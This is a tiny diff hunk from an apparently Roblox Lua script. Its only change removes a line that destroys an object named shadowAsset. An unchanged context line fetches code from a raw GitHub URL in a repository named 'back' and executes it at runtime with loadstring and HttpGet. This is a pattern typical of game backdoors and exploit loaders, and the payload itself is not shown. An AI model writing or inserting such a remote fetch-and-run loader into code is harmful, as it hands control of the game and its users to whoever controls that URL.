@@ -90,8 +90,6 @@ local function spawnShadow()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/eoyoustme/back/refs/heads/main/cruc"))()
 			end)
 
-   shadowAsset:Destroy()
-
 			return
 		end
 
